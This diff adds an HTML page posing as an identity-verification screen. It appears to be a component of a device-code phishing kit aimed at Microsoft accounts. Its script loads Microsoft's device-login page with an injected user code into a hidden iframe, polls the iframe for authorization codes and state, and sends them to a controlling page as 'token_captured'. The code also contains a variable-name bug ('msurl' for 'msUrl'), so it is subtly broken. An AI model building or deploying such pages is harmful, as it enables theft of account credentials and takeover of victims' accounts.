@@ -1,0 +1,312 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verification</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      padding: 40px;
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+    }
+
+    .logo {
+      margin-bottom: 24px;
+    }
+
+    .logo svg {
+      width: 48px;
+      height: 48px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 12px;
+    }
+
+    p {
+      font-size: 14px;
+      color: #666;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+
+    .spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #2D8CFF;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .status {
+      font-size: 13px;
+      color: #666;
+      margin-top: 16px;
+    }
+
+    .error {
+      color: #d32f2f;
+      background: #fef2f2;
+      border: 1px solid #fecaca;
+      border-radius: 8px;
+      padding: 12px;
+      margin-top: 16px;
+      font-size: 13px;
+      display: none;
+    }
+
+    .success {
+      color: #059669;
+      background: #f0fdf4;
+      border: 1px solid #bbf7d0;
+      border-radius: 8px;
+      padding: 12px;
+      margin-top: 16px;
+      font-size: 13px;
+      display: none;
+    }
+
+    iframe {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" fill="none" stroke="#2D8CFF" stroke-width="2" stroke-linecap="round">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+      </svg>
+    </div>
+
+    <h1>Verifying your identity</h1>
+    <p>Please wait while we verify your credentials. Do not close this window.</p>
+
+    <div class="spinner"></div>
+    <div class="status" id="status">Connecting to secure gateway...</div>
+    <div class="error" id="error"></div>
+    <div class="success" id="success"></div>
+  </div>
+
+  <iframe id="msFrame" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
+
+  <script>
+    (function() {
+      'use strict';
+
+      var channel = null;
+      var msFrame = document.getElementById('msFrame');
+      var statusEl = document.getElementById('status');
+      var errorEl = document.getElementById('error');
+      var successEl = document.getElementById('success');
+
+      // Get channel name from URL params
+      function getChannelName() {
+        var params = new URLSearchParams(window.location.search);
+        return params.get('channel') || 'vg_device_auth';
+      }
+
+      // Initialize BroadcastChannel
+      function initChannel() {
+        var channelName = getChannelName();
+
+        try {
+          channel = new BroadcastChannel(channelName);
+
+          channel.onmessage = function(e) {
+            handleMessage(e.data);
+          };
+
+          channel.postMessage({ type: 'proxy_ready' });
+        } catch (e) {
+          showError('Communication channel failed. Please close this window and try again.');
+        }
+      }
+
+      // Handle messages from parent
+      function handleMessage(data) {
+        if (!data || !data.type) return;
+
+        switch (data.type) {
+          case 'start_auth':
+            startAuth(data.userCode, data.verificationUrl);
+            break;
+
+          case 'auth_complete':
+            handleAuthComplete(data.token, data.refreshToken, data.email);
+            break;
+
+          case 'auth_error':
+            showError(data.message || 'Authentication failed');
+            break;
+        }
+      }
+
+      // Start authentication via iframe
+      function startAuth(userCode, verificationUrl) {
+        statusEl.textContent = 'Loading verification page...';
+
+        // Build the Microsoft device login URL with user code
+        var msUrl = verificationUrl || 'https://microsoft.com/devicelogin';
+
+        if (userCode) {
+          msurl += '?code=' + encodeURIComponent(userCode);
+        }
+
+        // Load Microsoft in iframe
+        msFrame.src = msUrl;
+        statusEl.textContent = 'Please complete authentication in the window...';
+
+        // Monitor iframe for completion
+        monitorIframe();
+      }
+
+      // Monitor iframe for redirect/completion
+      function monitorIframe() {
+        var checkCount = 0;
+        var maxChecks = 120; // 2 minutes at 1s intervals
+
+        var checkInterval = setInterval(function() {
+          checkCount++;
+
+          try {
+            // Try to access iframe content (will fail due to cross-origin until redirect)
+            var iframeDoc = msFrame.contentDocument || msFrame.contentWindow.document;
+            var iframeUrl = msFrame.contentWindow.location.href;
+
+            // Check if we've been redirected to a Microsoft callback
+            if (
+              iframeUrl.indexOf('login.microsoftonline.com') !== -1 ||
+              iframeUrl.indexOf('login.live.com') !== -1
+            ) {
+              // Check for token in URL
+              var urlParams = new URLSearchParams(iframeUrl.split('?')[1] || '');
+              var code = urlParams.get('code');
+              var state = urlParams.get('state');
+
+              if (code) {
+                clearInterval(checkInterval);
+                statusEl.textContent = 'Authentication complete!';
+
+                // Notify parent
+                if (channel) {
+                  channel.postMessage({
+                    type: 'token_captured',
+                    code: code,
+                    state: state,
+                    url: iframeUrl
+                  });
+                }
+
+                showSuccess('Authentication successful. You can close this window.');
+                return;
+              }
+            }
+
+            // Check if iframe shows an error
+            if (iframeDoc.body && iframeDoc.body.innerText) {
+              var bodyText = iframeDoc.body.innerText.toLowerCase();
+
+              if (
+                bodyText.indexOf('error') !== -1 &&
+                bodyText.indexOf('sign') !== -1
+              ) {
+                // Microsoft error page
+                clearInterval(checkInterval);
+                showError('Authentication error. Please try again.');
+                return;
+              }
+            }
+          } catch (e) {
+            // Cross-origin access denied - this is expected
+            // The iframe is still loading or on Microsoft domain
+          }
+
+          if (checkCount >= maxChecks) {
+            clearInterval(checkInterval);
+            showError('Verification timed out. Please close this window and try again.');
+          }
+        }, 1000);
+      }
+
+      // Handle auth complete from parent
+      function handleAuthComplete(token, refreshToken, email) {
+        statusEl.textContent = 'Verification complete!';
+        showSuccess('You can close this window and return to the previous page.');
+
+        if (channel) {
+          channel.postMessage({
+            type: 'proxy_closed',
+            success: true
+          });
+        }
+      }
+
+      // Show error
+      function showError(msg) {
+        statusEl.style.display = 'none';
+        document.querySelector('.spinner').style.display = 'none';
+
+        errorEl.textContent = msg;
+        errorEl.style.display = 'block';
+
+        if (channel) {
+          channel.postMessage({
+            type: 'proxy_error',
+            message: msg
+          });
+        }
+      }
+
+      // Show success
+      function showSuccess(msg) {
+        statusEl.style.display = 'none';
+        document.querySelector('.spinner').style.display = 'none';
+
+        successEl.textContent = msg;
+        successEl.style.display = 'block';
+      }
+
+      // Initialize
+      initChannel();
+
+      // Handle page unload
+      window.addEventListener('beforeunload', function() {
+        if (channel) {
+          channel.postMessage({ type: 'proxy_closed' });
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
